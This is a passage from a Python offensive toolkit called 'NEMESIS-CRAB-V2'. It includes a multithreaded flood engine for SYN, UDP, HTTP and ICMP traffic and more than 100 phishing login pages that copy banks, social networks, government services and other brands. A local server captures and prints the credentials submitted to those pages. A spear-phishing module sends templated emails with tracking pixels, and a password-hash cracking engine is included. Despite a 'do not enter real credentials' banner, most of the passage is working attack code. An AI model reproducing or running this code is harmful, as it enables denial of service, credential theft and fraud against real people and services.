                        headers={"User-Agent": "NEMESIS-CRAB-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "NEMESIS-CRAB-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-tuning', options['tuning']])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# =====================
# DOS ATTACK ENGINE
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        max_threads = self.config.get('dos.max_threads', 100)
        if threads > max_threads:
            return {'success': False, 'error': f'Threads exceed maximum ({max_threads})'}
        
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        packets_sent = 0
        
        def attack_thread():
            nonlocal packets_sent
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'attack_id': attack_id,
            'type': attack_type,
            'target': target_ip,
            'port': port,
            'duration': duration,
            'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "NEMESIS-CRAB-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# SOCIAL ENGINEERING TOOLS (100+ Templates)
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load 100+ phishing templates"""
        return {
            # Social Media (20)
            'facebook': self._template("facebook", "#1877f2", "Facebook"),
            'instagram': self._template("instagram", "#0095f6", "Instagram"),
            'twitter': self._template("twitter", "#1d9bf0", "X / Twitter"),
            'linkedin': self._template("linkedin", "#0a66c2", "LinkedIn"),
            'snapchat': self._template("snapchat", "#fffc00", "Snapchat"),
            'tiktok': self._template("tiktok", "#fe2c55", "TikTok"),
            'reddit': self._template("reddit", "#ff4500", "Reddit"),
            'pinterest': self._template("pinterest", "#e60023", "Pinterest"),
            'tumblr': self._template("tumblr", "#36465d", "Tumblr"),
            'flickr': self._template("flickr", "#ff0084", "Flickr"),
            'quora': self._template("quora", "#b92b27", "Quora"),
            'medium': self._template("medium", "#000000", "Medium"),
            'youtube': self._template("youtube", "#ff0000", "YouTube"),
            'twitch': self._template("twitch", "#9146ff", "Twitch"),
            'discord': self._template("discord", "#5865f2", "Discord"),
            'telegram': self._template("telegram", "#2aabee", "Telegram"),
            'whatsapp': self._template("whatsapp", "#25d366", "WhatsApp"),
            'wechat': self._template("wechat", "#07c160", "WeChat"),
            'line': self._template("line", "#00c300", "LINE"),
            'viber': self._template("viber", "#7360f2", "Viber"),
            
            # Email Providers (10)
            'gmail': self._template("gmail", "#1a73e8", "Gmail"),
            'yahoo': self._template("yahoo", "#410093", "Yahoo"),
            'outlook': self._template("outlook", "#0078d4", "Outlook"),
            'protonmail': self._template("protonmail", "#505061", "ProtonMail"),
            'zoho': self._template("zoho", "#e42527", "Zoho Mail"),
            'icloud': self._template("icloud", "#0071e3", "iCloud"),
            'aol': self._template("aol", "#ff0b00", "AOL"),
            'gmx': self._template("gmx", "#1c449b", "GMX"),
            'mailcom': self._template("mailcom", "#0066cc", "Mail.com"),
            'yandex': self._template("yandex", "#ff0000", "Yandex"),
            
            # Tech Companies (15)
            'microsoft': self._template("microsoft", "#0078d4", "Microsoft"),
            'google': self._template("google", "#4285f4", "Google"),
            'apple': self._template("apple", "#0071e3", "Apple"),
            'amazon': self._template("amazon", "#ff9900", "Amazon"),
            'github': self._template("github", "#24292f", "GitHub"),
            'gitlab': self._template("gitlab", "#fc6d26", "GitLab"),
            'bitbucket': self._template("bitbucket", "#0052cc", "Bitbucket"),
            'adobe': self._template("adobe", "#ff0000", "Adobe"),
            'dropbox': self._template("dropbox", "#0061ff", "Dropbox"),
            'slack': self._template("slack", "#611f69", "Slack"),
            'zoom': self._template("zoom", "#2d8cff", "Zoom"),
            'teams': self._template("teams", "#5059e8", "Teams"),
            'onedrive': self._template("onedrive", "#0078d4", "OneDrive"),
            'office365': self._template("office365", "#0078d4", "Office 365"),
            'salesforce': self._template("salesforce", "#00a1e0", "Salesforce"),
            
            # Finance (20)
            'paypal': self._template("paypal", "#0070ba", "PayPal"),
            'venmo': self._template("venmo", "#008cff", "Venmo"),
            'cashapp': self._template("cashapp", "#00d632", "Cash App"),
            'chase': self._template("chase", "#1174c2", "Chase"),
            'wellsfargo': self._template("wellsfargo", "#bc1f2c", "Wells Fargo"),
            'bankofamerica': self._template("bankofamerica", "#e31837", "Bank of America"),
            'citibank': self._template("citibank", "#003b70", "Citibank"),
            'capitalone': self._template("capitalone", "#004977", "Capital One"),
            'americanexpress': self._template("americanexpress", "#006fcf", "American Express"),
            'discover': self._template("discover", "#ff6000", "Discover"),
            'barclays': self._template("barclays", "#00aeef", "Barclays"),
            'hsbc': self._template("hsbc", "#db0011", "HSBC"),
            'revolut': self._template("revolut", "#0075eb", "Revolut"),
            'monzo': self._template("monzo", "#ff3464", "Monzo"),
            'stripe': self._template("stripe", "#635bff", "Stripe"),
            'square': self._template("square", "#000000", "Square"),
            'coinbase': self._template("coinbase", "#0052ff", "Coinbase"),
            'binance': self._template("binance", "#f0b90b", "Binance"),
            'kraken': self._template("kraken", "#5741d9", "Kraken"),
            'metamask': self._template("metamask", "#f6851b", "MetaMask"),
            
            # Gaming (10)
            'steam': self._template("steam", "#67c1f5", "Steam"),
            'epicgames': self._template("epicgames", "#000000", "Epic Games"),
            'roblox': self._template("roblox", "#e32c2c", "Roblox"),
            'minecraft': self._template("minecraft", "#6b8c42", "Minecraft"),
            'xbox': self._template("xbox", "#107c10", "Xbox"),
            'playstation': self._template("playstation", "#003791", "PlayStation"),
            'nintendo': self._template("nintendo", "#e60012", "Nintendo"),
            'battlenet': self._template("battlenet", "#0074e0", "Battle.net"),
            'ubisoft': self._template("ubisoft", "#0070ff", "Ubisoft"),
            'ea': self._template("ea", "#ff0000", "EA Games"),
            
            # Dating (10)
            'tinder': self._template("tinder", "#ff5a60", "Tinder"),
            'bumble': self._template("bumble", "#ff6b6b", "Bumble"),
            'hinge': self._template("hinge", "#1a1a1a", "Hinge"),
            'okcupid': self._template("okcupid", "#ff4e6b", "OkCupid"),
            'match': self._template("match", "#ff6b6b", "Match.com"),
            'plentyoffish': self._template("plentyoffish", "#ff6b6b", "Plenty of Fish"),
            'grindr': self._template("grindr", "#ffcc00", "Grindr"),
            'her': self._template("her", "#ff6b6b", "HER"),
            'coffee_meets_bagel': self._template("coffee_meets_bagel", "#ff6b6b", "Coffee Meets Bagel"),
            'happn': self._template("happn", "#ff6b6b", "Happn"),
            
            # Streaming (10)
            'netflix': self._template("netflix", "#e50914", "Netflix"),
            'spotify': self._template("spotify", "#1ed760", "Spotify"),
            'hulu': self._template("hulu", "#1ce783", "Hulu"),
            'disneyplus': self._template("disneyplus", "#113ccf", "Disney+"),
            'hbomax': self._template("hbomax", "#5822b4", "HBO Max"),
            'primevideo': self._template("primevideo", "#00a8e1", "Prime Video"),
            'appletv': self._template("appletv", "#000000", "Apple TV+"),
            'paramount': self._template("paramount", "#0064ff", "Paramount+"),
            'peacock': self._template("peacock", "#000000", "Peacock"),
            'crunchyroll': self._template("crunchyroll", "#f47521", "Crunchyroll"),
            
            # Shopping (10)
            'ebay': self._template("ebay", "#e53238", "eBay"),
            'walmart': self._template("walmart", "#0071dc", "Walmart"),
            'target': self._template("target", "#cc0000", "Target"),
            'bestbuy': self._template("bestbuy", "#0046be", "Best Buy"),
            'etsy': self._template("etsy", "#f1641e", "Etsy"),
            'aliexpress': self._template("aliexpress", "#ff6a00", "AliExpress"),
            'alibaba': self._template("alibaba", "#ff6a00", "Alibaba"),
            'wish': self._template("wish", "#2fb7ec", "Wish"),
            'shein': self._template("shein", "#000000", "Shein"),
            'temu': self._template("temu", "#fb7701", "Temu"),
            
            # Cloud & Services (10)
            'aws': self._template("aws", "#ff9900", "AWS"),
            'azure': self._template("azure", "#0078d4", "Azure"),
            'gcp': self._template("gcp", "#4285f4", "Google Cloud"),
            'digitalocean': self._template("digitalocean", "#0080ff", "DigitalOcean"),
            'cloudflare': self._template("cloudflare", "#f38020", "Cloudflare"),
            'namecheap': self._template("namecheap", "#de3723", "Namecheap"),
            'godaddy': self._template("godaddy", "#00a4a6", "GoDaddy"),
            'heroku': self._template("heroku", "#430098", "Heroku"),
            'vercel': self._template("vercel", "#000000", "Vercel"),
            'netlify': self._template("netlify", "#00c7b7", "Netlify"),
            
            # Education (5)
            'coursera': self._template("coursera", "#0056d2", "Coursera"),
            'udemy': self._template("udemy", "#a435f0", "Udemy"),
            'edx': self._template("edx", "#02262b", "edX"),
            'khanacademy': self._template("khanacademy", "#14bf96", "Khan Academy"),
            'duolingo': self._template("duolingo", "#58cc71", "Duolingo"),
            
            # Government (5)
            'irs': self._template("irs", "#003366", "IRS"),
            'dmv': self._template("dmv", "#003366", "DMV"),
            'usps': self._template("usps", "#333366", "USPS"),
            'fedex': self._template("fedex", "#4d148c", "FedEx"),
            'ups': self._template("ups", "#351c15", "UPS"),
            
            # VPN & Security (5)
            'nordvpn': self._template("nordvpn", "#4687ff", "NordVPN"),
            'expressvpn': self._template("expressvpn", "#da3940", "ExpressVPN"),
            'surfshark': self._template("surfshark", "#1ebfbf", "Surfshark"),
            'lastpass': self._template("lastpass", "#d32d27", "LastPass"),
            '1password': self._template("1password", "#0572ec", "1Password"),
            
            # Custom
            'custom': self._custom_template()
        }
    
    def _template(self, name: str, color: str, display_name: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{display_name}</title>
<style>
body{{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}}
.logo{{color:{color};font-size:32px;text-align:center;margin-bottom:20px}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}}
button{{width:100%;padding:14px;background:{color};color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px;font-size:12px}}
</style>
</head>
<body>
<div class="login-box"><div class="logo">{display_name}</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _custom_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#0a1628 0%,#1a2a6c 50%,#0f3460 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1)}
.logo{text-align:center;margin-bottom:30px;color:#3f9dff;font-size:28px;font-weight:bold}
input{width:100%;padding:14px;margin:10px 0;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#fff;box-sizing:border-box;transition:all 0.3s}
input:focus{outline:none;border-color:#3f9dff;background:rgba(255,255,255,0.08)}
button{width:100%;padding:14px;background:linear-gradient(135deg,#3f9dff 0%,#1565c0 100%);color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;font-size:16px;transition:all 0.3s}
button:hover{transform:scale(1.02);box-shadow:0 10px 30px rgba(63,157,255,0.3)}
.warning{margin-top:20px;padding:10px;background:rgba(255,0,0,0.1);border-radius:8px;color:#ff6b6b;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">🦀 NEMESIS-CRAB-V2</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Secure Login</button></form>
<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        template_func = self.templates.get(platform, self._custom_template)
        html = template_func() if callable(template_func) else template_func
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        
        from http.server import HTTPServer, BaseHTTPRequestHandler
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                if self.server_instance and self.server_instance.html:
                    self.wfile.write(self.server_instance.html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                if self.server_instance and self.server_instance.db and username and password:
                    self.server_instance.db.save_captured_credential(
                        self.server_instance.link_id, username, password, client_ip, user_agent
                    )
                    print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {client_ip}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        server.server_instance = self
        server.link_id = link_id
        server.html = link_data['html']
        
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.phishing_server = server
        
        return True
    
    def stop_server(self):
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)

# =====================
# SPEAR PHISHING ENGINE
# =====================
class SpearPhishingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_campaign(self, name: str, template: str, subject: str, from_email: str,
                       targets: List[Dict], scheduled_time: str = None) -> SpearPhishingCampaign:
        campaign = SpearPhishingCampaign(
            id=str(uuid.uuid4())[:8],
            name=name,
            template=template,
            subject=subject,
            from_email=from_email,
            targets=targets,
            scheduled_time=scheduled_time,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_spear_phishing_campaign(campaign)
        return campaign
    
    def send_campaign(self, campaign_id: str) -> Dict:
        campaigns = self.db.get_spear_phishing_campaigns()
        campaign_data = next((c for c in campaigns if c['id'] == campaign_id), None)
        if not campaign_data:
            return {'success': False, 'error': 'Campaign not found'}
        
        smtp_server = self.config.get('spear_phishing.smtp_server', '')
        smtp_port = self.config.get('spear_phishing.smtp_port', 587)
        smtp_username = self.config.get('spear_phishing.smtp_username', '')
        smtp_password = self.config.get('spear_phishing.smtp_password', '')
        
        if not smtp_server:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        sent_count = 0
        targets = json.loads(campaign_data['targets']) if campaign_data['targets'] else []
        
        for target in targets:
            try:
                msg = email.message.EmailMessage()
                msg['Subject'] = campaign_data['subject']
                msg['From'] = campaign_data['from_email']
                msg['To'] = target.get('email', '')
                
                template = campaign_data['template']
                for key, value in target.items():
                    template = template.replace(f"{{{{{key}}}}}", str(value))
                
                tracking_url = f"{self.config.get('spear_phishing.tracking_server', 'http://localhost:5000')}/track/{campaign_id}/{target.get('email', '')}"
                template += f'\n<img src="{tracking_url}" width="1" height="1">'
                
                if '<html' in template.lower():
                    msg.set_content(template, subtype='html')
                else:
                    msg.set_content(template)
                
                with smtplib.SMTP(smtp_server, smtp_port) as server:
                    server.starttls()
                    server.login(smtp_username, smtp_password)
                    server.send_message(msg)
                
                sent_count += 1
            except Exception as e:
                print(f"Failed to send to {target.get('email', 'unknown')}: {e}")
        
        self.db.conn.execute(
            "UPDATE spear_phishing_campaigns SET sent_count = ?, status = 'sent' WHERE id = ?",
            (sent_count, campaign_id)
        )
        self.db.conn.commit()
        
        return {
            'success': True,
            'campaign_id': campaign_id,
            'sent_count': sent_count,
            'total_targets': len(targets)
        }
    
    def get_campaigns(self) -> List[Dict]:
        return self.db.get_spear_phishing_campaigns()

# =====================
# CRACKING ENGINE
# =====================
class CrackingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
        self.wordlist_path = config.get('cracking.wordlist_path', '/usr/share/wordlists/rockyou.txt')
        self.default_hash_type = config.get('cracking.default_hash_type', 0)
    
    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
        job_id = str(uuid.uuid4())[:8]
        wordlist = wordlist or self.wordlist_path
        
        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
        
        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
        self.db.update_cracking_job(job_id, 'running')
        
        try:
            hash_type_num = self._get_hash_type_num(hash_type)
            
            if not shutil.which(self.hashcat_path):
                result = self._crack_with_python(hash_type, hash_value, wordlist)
                if result:
                    self.db.update_cracking_job(job_id, 'completed', result, True)
                else:
                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
                return
            
            cmd = [
                self.hashcat_path,
                '-m', str(hash_type_num),
                '-a', '0',
                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
                hash_value,
                wordlist
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read().strip()
                    if ':' in content:
                        cracked = content.split(':', 1)[1]
                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
                    else:
                        self.db.update_cracking_job(job_id, 'completed', content, True)
            else:
                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
                
        except subprocess.TimeoutExpired:
            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
        except Exception as e:
            self.db.update_cracking_job(job_id, 'failed', str(e), False)
    
    def _get_hash_type_num(self, hash_type: str) -> int:
        hash_types = {
            'md5': 0,
            'sha1': 100,
            'sha256': 1400,
            'sha512': 1700,
            'ntlm': 1000,
            'mysql': 200,
            'mysql5': 300,
            'postgres': 12,
            'mssql': 131,
            'oracle': 3100,
            'bcrypt': 3200,
            'scrypt': 8900,
            'pbkdf2': 10900
        }
        return hash_types.get(hash_type.lower(), self.default_hash_type)
    
    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if not word:
                        continue
                    
                    if hash_type.lower() == 'md5':
                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha1':
                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha256':
                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha512':
                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
                            return word
            return None
        except:
            return None
    
    def get_job_status(self, job_id: str) -> Optional[Dict]:
        jobs = self.db.get_cracking_jobs()
        for job in jobs:
            if job['job_id'] == job_id:
                return dict(job)
        return None
    
    def get_all_jobs(self) -> List[Dict]:
        return self.db.get_cracking_jobs()

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
            severity = self._determine_severity(vulnerabilities)
            
            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line:
                severity = 'high' if 'HIGH' in line else 'critical' if 'CRITICAL' in line else 'medium'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, config: ConfigManager,
                 ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None,
                 nikto: NiktoScanner = None,
                 dos_engine: DOSEngine = None,
                 spear_phishing: SpearPhishingEngine = None,
                 keylogger: KeyloggerModule = None,
                 domain_hosting: DomainHostingEngine = None,
                 cracking: CrackingEngine = None,
                 docker_scanner: DockerScanner = None,
                 re_tools: ReverseEngineeringTools = None,
                 payload_gen: PayloadGenerator = None,
                 report_gen: ReportGenerator = None):
        self.db = db
        self.config = config
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.dos = dos_engine
        self.spear = spear_phishing
        self.keylogger = keylogger
        self.domain_hosting = domain_hosting
        self.cracking = cracking
        self.docker_scanner = docker_scanner
        self.re_tools = re_tools
        self.payload_gen = payload_gen
        self.report_gen = report_gen
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # ===== Ping Commands =====
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'ping_flood': self._ping_flood,
            'ping_mtu': self._ping_mtu,
            'ping_size': self._ping_size,
            'ping_count': self._ping_count,
            'ping_interval': self._ping_interval,
            'ping_timeout': self._ping_timeout,
            'ping_ttl': self._ping_ttl,
            'ping_interface': self._ping_interface,
            'ping_source': self._ping_source,
            'ping_pattern': self._ping_pattern,
            'ping_record': self._ping_record,
            'ping_timestamp': self._ping_timestamp,
            'ping_quiet': self._ping_quiet,
            'ping_verbose': self._ping_verbose,
            
            # ===== Traceroute Commands =====
            'traceroute': self._traceroute,
            'traceroute6': self._traceroute6,
            'traceroute_tcp': self._traceroute_tcp,
            'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            'traceroute_max_hops': self._traceroute_max_hops,
            'traceroute_first_hop': self._traceroute_first_hop,
            'traceroute_queries': self._traceroute_queries,
            'traceroute_wait': self._traceroute_wait,
            'traceroute_port': self._traceroute_port,
